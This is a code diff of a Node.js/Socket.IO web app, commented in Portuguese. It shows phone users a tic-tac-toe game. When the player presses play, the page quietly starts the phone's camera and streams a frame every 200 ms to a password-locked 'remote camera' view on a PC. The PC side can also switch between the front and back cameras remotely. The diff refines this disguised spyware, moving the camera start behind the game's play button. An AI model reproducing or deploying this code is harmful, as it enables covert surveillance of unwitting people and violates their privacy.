@@ -15,11 +15,7 @@ const SENHA = "171172";
 function detectarDispositivo(userAgent) {
   const ua = userAgent.toLowerCase();
   const isMobile = /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
-  const isTablet = /ipad|tablet|kindle|silk|playbook/i.test(ua);
-  
-  if (isTablet) return 'tablet';
-  if (isMobile) return 'mobile';
-  return 'desktop';
+  return isMobile ? 'mobile' : 'desktop';
 }
 
 app.get('/', (req, res) => {
@@ -40,6 +36,7 @@ app.get('/', (req, res) => {
             background: #0a0a0a;
             min-height: 100vh;
             padding: 20px;
+            color: #00ff00;
         }
         .container {
             max-width: 1200px;
@@ -47,36 +44,18 @@ app.get('/', (req, res) => {
             background: #0f0f0f;
             border: 2px solid #00ff00;
             border-radius: 10px;
-            padding: 30px;
-            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+            padding: 20px;
         }
         
-        /* Estilos para CELULAR - JOGO DA VELHA */
+        /* Estilos Mobile */
         .mobile-container {
-            animation: fadeIn 1s;
             text-align: center;
-            max-width: 500px;
-            margin: 0 auto;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
         }
         
         .game-title {
             font-size: 36px;
             color: #00ff00;
-            margin-bottom: 20px;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 4px;
+            margin-bottom: 30px;
             text-shadow: 0 0 10px #00ff00;
         }
         
@@ -85,121 +64,79 @@ app.get('/', (req, res) => {
             color: #00ff00;
             border: 3px solid #00ff00;
             font-size: 32px;
-            padding: 25px 60px;
+            padding: 20px 50px;
             border-radius: 15px;
             cursor: pointer;
+            margin: 30px 0;
             font-family: 'Courier New', monospace;
             font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 4px;
-            margin: 40px 0;
-            transition: all 0.3s;
-            animation: pulse 2s infinite;
         }
         
         .play-button:hover {
             background: #00ff00;
             color: black;
-            box-shadow: 0 0 50px #00ff00;
-        }
-        
-        /* Jogo da Velha */
-        .game-screen {
-            display: none;
         }
         
         .board {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            margin: 30px 0;
+            gap: 10px;
+            margin: 20px 0;
             aspect-ratio: 1/1;
         }
         
         .cell {
             background: #1a1a1a;
             border: 2px solid #00ff00;
-            border-radius: 12px;
+            border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 64px;
+            font-size: 48px;
             font-weight: bold;
             color: #00ff00;
             cursor: pointer;
-            transition: all 0.3s;
             aspect-ratio: 1/1;
-            text-shadow: 0 0 20px #00ff00;
-        }
-        
-        .cell:hover {
-            background: #2a2a2a;
-            box-shadow: 0 0 30px #00ff00;
-        }
-        
-        .cell.winner {
-            background: #00ff00;
-            color: black;
-            text-shadow: none;
         }
         
         .turn-indicator {
-            background: #0f0f0f;
+            background: #1a1a1a;
             padding: 15px;
-            border-radius: 8px;
-            color: #00ff00;
-            font-size: 22px;
-            font-weight: bold;
-            margin: 20px 0;
             border: 1px solid #00ff00;
+            margin: 20px 0;
+            font-size: 20px;
         }
         
-        /* Estilos para PC */
+        /* Estilos PC */
         .pc-container {
-            text-align: left;
-            color: #00ff00;
-        }
-        
-        .hacker-title {
-            font-size: 36px;
-            color: #00ff00;
-            text-align: center;
-            margin-bottom: 30px;
-            text-transform: uppercase;
-            letter-spacing: 4px;
-            text-shadow: 0 0 20px #00ff00;
-        }
-        
-        .pc-layout {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 30px;
+            gap: 20px;
         }
         
         .camera-section, .game-section {
             background: #1a1a1a;
             border: 2px solid #00ff00;
-            border-radius: 15px;
-            padding: 20px;
+            border-radius: 10px;
+            padding: 15px;
         }
         
         .video-container {
             position: relative;
             width: 100%;
-            background: #0a0a0a;
+            background: #000;
             border: 2px solid #00ff00;
-            border-radius: 10px;
+            border-radius: 8px;
             overflow: hidden;
             aspect-ratio: 4/3;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
         }
         
-        #remoteVideo {
+        #remoteImage {
             width: 100%;
             height: 100%;
             object-fit: cover;
             display: block;
-            background: #0a0a0a;
         }
         
         #passwordOverlay {
@@ -208,32 +145,31 @@ app.get('/', (req, res) => {
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(10, 10, 10, 0.95);
+            background: rgba(0,0,0,0.9);
             display: flex;
             align-items: center;
             justify-content: center;
             z-index: 10;
-            border-radius: 8px;
         }
         
         .password-box {
             background: #0f0f0f;
             border: 2px solid #00ff00;
-            padding: 30px;
-            border-radius: 15px;
+            padding: 20px;
+            border-radius: 10px;
             text-align: center;
             width: 90%;
-            max-width: 300px;
+            max-width: 250px;
         }
         
         .password-box input {
             width: 100%;
-            padding: 15px;
-            font-size: 24px;
+            padding: 10px;
+            font-size: 20px;
             background: #1a1a1a;
             border: 2px solid #00ff00;
-            border-radius: 8px;
-            margin-bottom: 20px;
+            border-radius: 5px;
+            margin: 10px 0;
             text-align: center;
             color: #00ff00;
             font-family: 'Courier New', monospace;
@@ -243,43 +179,29 @@ app.get('/', (req, res) => {
             background: transparent;
             color: #00ff00;
             border: 2px solid #00ff00;
-            padding: 15px 30px;
-            border-radius: 8px;
+            padding: 10px 20px;
+            border-radius: 5px;
             cursor: pointer;
             width: 100%;
-            font-size: 18px;
             font-family: 'Courier New', monospace;
             font-weight: bold;
         }
         
-        .password-box button:hover {
-            background: #00ff00;
-            color: black;
-        }
-        
         .camera-controls {
             display: flex;
-            gap: 15px;
-            justify-content: center;
-            margin-top: 15px;
+            gap: 10px;
+            margin-top: 10px;
         }
         
         .camera-btn {
             background: transparent;
             color: #00ff00;
             border: 2px solid #00ff00;
-            padding: 12px 20px;
-            border-radius: 8px;
+            padding: 8px 15px;
+            border-radius: 5px;
             cursor: pointer;
-            font-size: 16px;
             flex: 1;
             font-family: 'Courier New', monospace;
-            font-weight: bold;
-        }
-        
-        .camera-btn:hover:not(:disabled) {
-            background: #00ff00;
-            color: black;
         }
         
         .camera-btn.active {
@@ -287,49 +209,27 @@ app.get('/', (req, res) => {
             color: black;
         }
         
-        .camera-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        
-        .terminal-text {
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            margin-top: 20px;
-            padding: 15px;
-            background: #0a0a0a;
-            border-left: 3px solid #00ff00;
-        }
-        
         .hidden {
             display: none !important;
+        }
+        
+        .debug-log {
+            background: #000;
+            color: #00ff00;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 12px;
+            border-left: 3px solid #00ff00;
+            max-height: 100px;
+            overflow-y: auto;
         }
         
         #localVideo {
             display: none;
         }
         
-        .status-dot {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            margin-right: 5px;
-        }
-        
-        .status-dot.online {
-            background: #00ff00;
-            box-shadow: 0 0 10px #00ff00;
-        }
-        
-        .status-dot.offline {
-            background: #ff0000;
-            box-shadow: 0 0 10px #ff0000;
-        }
-        
         @media (max-width: 768px) {
-            .pc-layout {
+            .pc-container {
                 grid-template-columns: 1fr;
             }
         }
@@ -337,76 +237,71 @@ app.get('/', (req, res) => {
 </head>
 <body>
     <div class="container">
-        <!-- CONTEÚDO PARA CELULAR -->
+        <!-- CONTEÚDO MOBILE -->
         <div id="mobileContent" class="mobile-container">
             <div class="game-title">🎮 JOGO DA VELHA</div>
             
-            <div id="welcomeScreen" class="welcome-screen">
-                <div class="game-subtitle">Desafie seu oponente online!</div>
+            <div id="welcomeScreen">
                 <button class="play-button" onclick="iniciarJogo()">▶ JOGAR</button>
-                <div class="terminal-text">
-                    <span class="status-dot" id="statusDot"></span> Status: <span id="statusText">Aguardando...</span>
+                <div class="debug-log" id="mobileDebug">
+                    > Aguardando...
                 </div>
             </div>
             
-            <div id="gameScreen" class="game-screen">
+            <div id="gameScreen" style="display:none;">
                 <div class="turn-indicator" id="turnIndicator">SUA VEZ</div>
                 <div class="board" id="board">
                     ${Array(9).fill(0).map((_, i) => `<div class="cell" data-index="${i}" onclick="fazerJogada(${i})"></div>`).join('')}
                 </div>
-                <div class="game-status" id="gameStatus">Aguardando oponente...</div>
-                <button class="reset-button" onclick="reiniciarJogo()">🔄 NOVO JOGO</button>
+                <div id="gameStatus" class="debug-log">Jogo iniciado!</div>
+                <button class="play-button" style="font-size:20px; padding:10px 20px; margin-top:20px;" onclick="reiniciarJogo()">NOVO JOGO</button>
             </div>
         </div>
         
-        <!-- CONTEÚDO PARA PC -->
+        <!-- CONTEÚDO PC -->
         <div id="pcContent" class="pc-container hidden">
-            <div class="hacker-title">⚡ SISTEMA DE MONITORAMENTO ⚡</div>
-            
-            <div class="pc-layout">
-                <div class="camera-section">
-                    <div class="section-title">📹 CÂMERA REMOTA</div>
-                    <div class="video-container">
-                        <!-- Usando IMG em vez de VIDEO para dataURL -->
-                        <img id="remoteVideo" style="width:100%; height:100%; object-fit:cover;">
-                        
-                        <div id="passwordOverlay">
-                            <div class="password-box">
-                                <h3>🔒 ACESSO RESTRITO</h3>
-                                <input type="password" id="senhaInput" maxlength="6" placeholder="******">
-                                <button onclick="verificarSenha()">AUTENTICAR</button>
-                                <div id="erroSenha" style="color:#ff0000; margin-top:10px; display:none;">Acesso negado!</div>
-                            </div>
+            <!-- Seção Câmera -->
+            <div class="camera-section">
+                <h3 style="text-align:center; margin-bottom:15px;">📹 CÂMERA REMOTA</h3>
+                <div class="video-container">
+                    <img id="remoteImage" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='640' height='480' viewBox='0 0 640 480'%3E%3Crect width='640' height='480' fill='%23000'/%3E%3Ctext x='320' y='240' font-family='Courier New' font-size='24' fill='%2300ff00' text-anchor='middle'%3EAGUARDANDO SINAL...%3C/text%3E%3C/svg%3E">
+                    
+                    <div id="passwordOverlay">
+                        <div class="password-box">
+                            <h3>🔒 ACESSO</h3>
+                            <input type="password" id="senhaInput" maxlength="6" placeholder="******">
+                            <button onclick="verificarSenha()">AUTENTICAR</button>
+                            <div id="erroSenha" style="color:#ff0000; margin-top:10px; display:none;">Senha incorreta!</div>
                         </div>
-                    </div>
-                    
-                    <div id="cameraControls" class="camera-controls hidden">
-                        <button class="camera-btn" id="cameraFrontBtn" onclick="mudarCamera('front')" disabled>FRONTAL</button>
-                        <button class="camera-btn" id="cameraBackBtn" onclick="mudarCamera('back')" disabled>TRASEIRA</button>
-                    </div>
-                    
-                    <div class="terminal-text" id="cameraTerminal">
-                        > Aguardando autenticação...
                     </div>
                 </div>
                 
-                <div class="game-section">
-                    <div class="section-title">🎮 JOGO DA VELHA</div>
-                    
-                    <div class="turn-indicator" id="pcTurnIndicator">AGUARDANDO...</div>
-                    <div class="board" id="pcBoard">
-                        ${Array(9).fill(0).map((_, i) => `<div class="cell" data-index="${i}" onclick="pcFazerJogada(${i})"></div>`).join('')}
-                    </div>
-                    <div class="game-status" id="pcGameStatus">
-                        <span class="status-dot offline"></span> Aguardando jogador...
-                    </div>
-                    <button class="reset-button" onclick="pcReiniciarJogo()">🔄 NOVO JOGO</button>
-                    <div class="terminal-text" id="pcTerminal"></div>
+                <div id="cameraControls" class="camera-controls hidden">
+                    <button class="camera-btn" id="cameraFrontBtn" onclick="mudarCamera('front')">FRONTAL</button>
+                    <button class="camera-btn" id="cameraBackBtn" onclick="mudarCamera('back')">TRASEIRA</button>
                 </div>
+                
+                <div class="debug-log" id="cameraDebug">
+                    > Aguardando autenticação...
+                </div>
+            </div>
+            
+            <!-- Seção Jogo -->
+            <div class="game-section">
+                <h3 style="text-align:center; margin-bottom:15px;">🎮 JOGO DA VELHA</h3>
+                <div class="turn-indicator" id="pcTurnIndicator">AGUARDANDO JOGADOR</div>
+                <div class="board" id="pcBoard">
+                    ${Array(9).fill(0).map((_, i) => `<div class="cell" data-index="${i}" onclick="pcFazerJogada(${i})"></div>`).join('')}
+                </div>
+                <div class="debug-log" id="pcDebug">
+                    > Aguardando conexão...
+                </div>
+                <button class="camera-btn" style="margin-top:15px;" onclick="pcReiniciarJogo()">NOVO JOGO</button>
             </div>
         </div>
         
-        <video id="localVideo" autoplay playsinline muted style="display:none;"></video>
+        <!-- Vídeo oculto para captura -->
+        <video id="localVideo" autoplay playsinline muted></video>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
@@ -418,17 +313,19 @@ app.get('/', (req, res) => {
         const mobileContent = document.getElementById('mobileContent');
         const pcContent = document.getElementById('pcContent');
         const localVideo = document.getElementById('localVideo');
-        const remoteVideo = document.getElementById('remoteVideo');
+        const remoteImage = document.getElementById('remoteImage');
         const passwordOverlay = document.getElementById('passwordOverlay');
         const cameraControls = document.getElementById('cameraControls');
-        const cameraTerminal = document.getElementById('cameraTerminal');
+        const cameraDebug = document.getElementById('cameraDebug');
+        const mobileDebug = document.getElementById('mobileDebug');
+        const pcDebug = document.getElementById('pcDebug');
         
         // Estado
         let visualizacaoLiberada = false;
-        let tentativas = 3;
         let mediaStream = null;
         let cameraAtual = 'back';
         let intervaloCaptura = null;
+        let tentativas = 3;
         
         // Estado do jogo
         let jogoAtivo = false;
@@ -438,27 +335,28 @@ app.get('/', (req, res) => {
         // Detectar dispositivo
         const isMobile = /mobile|android|iphone|ipod/i.test(navigator.userAgent.toLowerCase());
         
+        // Log
+        function log(el, msg) {
+            if (el) el.innerHTML = '> ' + new Date().toLocaleTimeString() + ': ' + msg;
+            console.log(msg);
+        }
+        
         // Configurar interface
         if (isMobile) {
-            console.log('📱 Modo celular');
             mobileContent.style.display = 'block';
             pcContent.style.display = 'none';
-            document.getElementById('statusDot').className = 'status-dot online';
-            document.getElementById('statusText').innerHTML = 'Conectado';
-            
-            // Iniciar câmera após 1 segundo
-            setTimeout(() => iniciarCamera('back'), 1000);
+            log(mobileDebug, 'Modo celular ativado');
         } else {
-            console.log('💻 Modo PC');
             mobileContent.style.display = 'none';
             pcContent.style.display = 'block';
+            log(pcDebug, 'Modo PC ativado');
             socket.emit('pcConectado');
         }
         
-        // ========== FUNÇÕES DA CÂMERA ==========
+        // ========== FUNÇÕES DA CÂMERA (MOBILE) ==========
         async function iniciarCamera(tipo) {
             try {
-                console.log('📷 Iniciando câmera:', tipo);
+                log(mobileDebug, \`Solicitando permissão da câmera \${tipo}...\`);
                 
                 if (intervaloCaptura) clearInterval(intervaloCaptura);
                 if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
@@ -466,8 +364,8 @@ app.get('/', (req, res) => {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
                         facingMode: tipo === 'front' ? 'user' : 'environment',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
+                        width: { ideal: 320 },
+                        height: { ideal: 240 }
                     },
                     audio: false
                 });
@@ -476,38 +374,37 @@ app.get('/', (req, res) => {
                 localVideo.srcObject = stream;
                 await localVideo.play();
                 
+                log(mobileDebug, '✅ Câmera ativada, iniciando transmissão...');
+                
                 const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
+                canvas.width = 320;
+                canvas.height = 240;
                 const ctx = canvas.getContext('2d');
                 
+                let frameCount = 0;
                 intervaloCaptura = setInterval(() => {
                     try {
                         if (localVideo.readyState === 4) {
-                            ctx.drawImage(localVideo, 0, 0, 640, 480);
-                            const frame = canvas.toDataURL('image/jpeg', 0.7);
+                            ctx.drawImage(localVideo, 0, 0, 320, 240);
+                            const frame = canvas.toDataURL('image/jpeg', 0.5);
                             socket.emit('frame', frame);
+                            
+                            frameCount++;
+                            if (frameCount % 30 === 0) {
+                                log(mobileDebug, \`Transmitindo... \${frameCount} frames\`);
+                            }
                         }
                     } catch (e) {
                         console.log('Erro captura:', e);
                     }
                 }, 200);
                 
-                console.log('✅ Câmera ativa');
-                
             } catch (err) {
-                console.error('Erro câmera:', err);
-                cameraTerminal.innerHTML = '> Erro: ' + err.message;
+                log(mobileDebug, '❌ Erro câmera: ' + err.message);
             }
         }
         
-        window.mudarCamera = function(tipo) {
-            if (!visualizacaoLiberada) return;
-            cameraAtual = tipo;
-            iniciarCamera(tipo);
-            socket.emit('trocarCamera', tipo);
-        };
-        
+        // ========== FUNÇÕES DE CONTROLE (PC) ==========
         window.verificarSenha = function() {
             const senha = document.getElementById('senhaInput').value;
             
@@ -515,27 +412,36 @@ app.get('/', (req, res) => {
                 passwordOverlay.classList.add('hidden');
                 visualizacaoLiberada = true;
                 cameraControls.classList.remove('hidden');
-                
-                document.getElementById('cameraFrontBtn').disabled = false;
-                document.getElementById('cameraBackBtn').disabled = false;
                 document.getElementById('cameraBackBtn').classList.add('active');
-                
-                cameraTerminal.innerHTML = '> Acesso liberado! Transmissão ativa.';
+                log(cameraDebug, '✅ Acesso liberado! Aguardando transmissão...');
             } else {
                 tentativas--;
                 document.getElementById('erroSenha').style.display = 'block';
                 if (tentativas <= 0) {
                     document.getElementById('senhaInput').disabled = true;
-                    document.querySelector('.password-box button').disabled = true;
                 }
             }
+        };
+        
+        window.mudarCamera = function(tipo) {
+            if (!visualizacaoLiberada) return;
+            
+            document.getElementById('cameraFrontBtn').classList.toggle('active', tipo === 'front');
+            document.getElementById('cameraBackBtn').classList.toggle('active', tipo === 'back');
+            
+            log(cameraDebug, \'Solicitando troca para câmera \' + tipo);
+            socket.emit('trocarCamera', tipo);
         };
         
         // ========== FUNÇÕES DO JOGO (MOBILE) ==========
         window.iniciarJogo = function() {
             document.getElementById('welcomeScreen').style.display = 'none';
             document.getElementById('gameScreen').style.display = 'block';
+            log(mobileDebug, 'Jogador pronto, aguardando oponente...');
             socket.emit('jogadorPronto');
+            
+            // Iniciar câmera
+            setTimeout(() => iniciarCamera('back'), 500);
         };
         
         window.fazerJogada = function(index) {
@@ -564,8 +470,8 @@ app.get('/', (req, res) => {
         };
         
         function verificarVitoria(jogador) {
-            const combinacoes = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
-            return combinacoes.some(combo => combo.every(i => celulas[i] === jogador));
+            const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+            return wins.some(combo => combo.every(i => celulas[i] === jogador));
         }
         
         window.reiniciarJogo = function() {
@@ -587,14 +493,14 @@ app.get('/', (req, res) => {
             
             if (verificarVitoriaPC('O')) {
                 jogoAtivo = false;
-                document.getElementById('pcGameStatus').innerHTML = '🎉 VOCÊ VENCEU!';
+                document.getElementById('pcDebug').innerHTML = '🎉 VOCÊ VENCEU!';
                 socket.emit('jogadaPC', { index, vitoria: true });
                 return;
             }
             
             if (!celulas.includes('')) {
                 jogoAtivo = false;
-                document.getElementById('pcGameStatus').innerHTML = '🤝 EMPATE!';
+                document.getElementById('pcDebug').innerHTML = '🤝 EMPATE!';
                 socket.emit('jogadaPC', { index, empate: true });
                 return;
             }
@@ -605,8 +511,8 @@ app.get('/', (req, res) => {
         };
         
         function verificarVitoriaPC(jogador) {
-            const combinacoes = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
-            return combinacoes.some(combo => combo.every(i => celulas[i] === jogador));
+            const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+            return wins.some(combo => combo.every(i => celulas[i] === jogador));
         }
         
         window.pcReiniciarJogo = function() {
@@ -615,24 +521,27 @@ app.get('/', (req, res) => {
             jogoAtivo = true;
             document.querySelectorAll('#pcBoard .cell').forEach(cell => cell.innerHTML = '');
             document.getElementById('pcTurnIndicator').innerHTML = 'VEZ DO OPONENTE';
-            document.getElementById('pcGameStatus').innerHTML = 'Jogo reiniciado!';
+            document.getElementById('pcDebug').innerHTML = 'Jogo reiniciado!';
             socket.emit('reiniciarJogo');
         };
         
-        // ========== SOCKET ==========
-        socket.on('connect', () => console.log('Conectado'));
+        // ========== SOCKET EVENTS ==========
+        socket.on('connect', () => {
+            if (isMobile) log(mobileDebug, 'Conectado ao servidor');
+            else log(pcDebug, 'Conectado ao servidor');
+        });
         
         socket.on('jogoIniciado', () => {
             if (isMobile) {
                 jogoAtivo = true;
                 document.getElementById('turnIndicator').innerHTML = 'SUA VEZ';
                 document.getElementById('gameStatus').innerHTML = 'Jogo iniciado!';
+                log(mobileDebug, 'Jogo iniciado!');
             } else {
                 jogoAtivo = true;
                 vezDoJogador = false;
                 document.getElementById('pcTurnIndicator').innerHTML = 'VEZ DO OPONENTE';
-                document.getElementById('pcGameStatus').innerHTML = '<span class="status-dot online"></span> Jogo iniciado!';
-                document.getElementById('pcTerminal').innerHTML = '> Jogador mobile conectado';
+                log(pcDebug, 'Jogador mobile conectado! Jogo iniciado.');
             }
         });
         
@@ -660,10 +569,10 @@ app.get('/', (req, res) => {
                     
                     if (data.vitoria) {
                         jogoAtivo = false;
-                        document.getElementById('pcGameStatus').innerHTML = '😢 OPONENTE VENCEU!';
+                        document.getElementById('pcDebug').innerHTML = '😢 OPONENTE VENCEU!';
                     } else if (data.empate) {
                         jogoAtivo = false;
-                        document.getElementById('pcGameStatus').innerHTML = '🤝 EMPATE!';
+                        document.getElementById('pcDebug').innerHTML = '🤝 EMPATE!';
                     } else {
                         vezDoJogador = false;
                         document.getElementById('pcTurnIndicator').innerHTML = 'SUA VEZ';
@@ -678,16 +587,20 @@ app.get('/', (req, res) => {
         });
         
         socket.on('trocarCamera', (tipo) => {
-            if (isMobile) iniciarCamera(tipo);
-        });
-        
-        socket.on('frame', (frameData) => {
-            if (visualizacaoLiberada && remoteVideo) {
-                remoteVideo.src = frameData;
+            if (isMobile) {
+                log(mobileDebug, \'Recebido comando para trocar câmera: \' + tipo);
+                iniciarCamera(tipo);
             }
         });
         
-        // Enter para enviar senha
+        socket.on('frame', (frameData) => {
+            if (visualizacaoLiberada && remoteImage) {
+                remoteImage.src = frameData;
+                log(cameraDebug, 'Frame recebido - atualizando imagem');
+            }
+        });
+        
+        // Enter para senha
         document.getElementById('senhaInput')?.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') verificarSenha();
         });
@@ -704,20 +617,33 @@ io.on('connection', (socket) => {
   let mobileId = null;
   
   socket.on('pcConectado', () => {
-    console.log('PC conectado');
+    console.log('PC conectado:', socket.id);
   });
   
   socket.on('jogadorPronto', () => {
     mobileId = socket.id;
-    console.log('Jogador mobile pronto');
+    console.log('Jogador mobile pronto:', socket.id);
     io.emit('jogoIniciado');
   });
   
-  socket.on('jogada', (data) => socket.broadcast.emit('jogadaRecebida', data));
-  socket.on('jogadaPC', (data) => socket.broadcast.emit('jogadaRecebida', data));
-  socket.on('reiniciarJogo', () => io.emit('jogoReiniciado'));
+  socket.on('jogada', (data) => {
+    console.log('Jogada mobile:', data);
+    socket.broadcast.emit('jogadaRecebida', data);
+  });
+  
+  socket.on('jogadaPC', (data) => {
+    console.log('Jogada PC:', data);
+    socket.broadcast.emit('jogadaRecebida', data);
+  });
+  
+  socket.on('reiniciarJogo', () => {
+    console.log('Reiniciando jogo');
+    io.emit('jogoReiniciado');
+  });
   
   socket.on('frame', (frameData) => {
+    // Log a cada 30 frames
+    if (Math.random() < 0.03) console.log('Frame recebido do celular');
     socket.broadcast.emit('frame', frameData);
   });
   
@@ -736,7 +662,9 @@ io.on('connection', (socket) => {
 
 server.listen(PORT, () => {
   console.log('='.repeat(50));
-  console.log('🎮 Servidor rodando na porta', PORT);
-  console.log('🔑 Senha:', SENHA);
+  console.log('🚀 Servidor rodando na porta', PORT);
+  console.log('🔑 Senha da câmera:', SENHA);
+  console.log('📱 Abra no celular e clique em JOGAR');
+  console.log('💻 Abra no PC e digite a senha');
   console.log('='.repeat(50));
 });
